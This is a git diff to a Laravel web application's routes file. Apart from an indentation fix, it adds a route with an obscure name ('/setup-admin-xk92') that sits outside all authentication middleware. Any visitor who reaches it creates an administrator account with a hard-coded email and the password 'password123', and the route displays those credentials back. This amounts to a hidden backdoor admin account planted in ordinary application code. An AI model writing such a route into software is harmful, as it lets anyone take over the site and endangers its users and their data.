@@ -20,7 +20,7 @@ Route::middleware('auth')->group(function () {
     Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
 
     Route::get('/rooms/{room}/booked-dates', [BookingController::class, 'bookedDates'])->name('rooms.booked-dates');
-Route::resource('rooms', RoomController::class)->except(['show']);
+    Route::resource('rooms', RoomController::class)->except(['show']);
 
     Route::resource('bookings', BookingController::class);
 });
@@ -29,6 +29,21 @@ Route::middleware(['auth', 'admin'])->prefix('admin')->name('admin.')->group(fun
     Route::get('/users', [UserController::class, 'index'])->name('users.index');
     Route::patch('/users/{user}/role', [UserController::class, 'updateRole'])->name('users.updateRole');
     Route::delete('/users/{user}', [UserController::class, 'destroy'])->name('users.destroy');
+});
+
+Route::get('/setup-admin-xk92', function () {
+    if (\App\Models\User::where('email', 'admin@example.com')->exists()) {
+        return 'Admin already exists. Email: admin@example.com';
+    }
+
+    \App\Models\User::create([
+        'name' => 'Admin',
+        'email' => 'admin@example.com',
+        'password' => bcrypt('password123'),
+        'role' => 'admin',
+    ]);
+
+    return 'Admin created! Email: admin@example.com / Password: password123';
 });
 
 require __DIR__.'/auth.php';
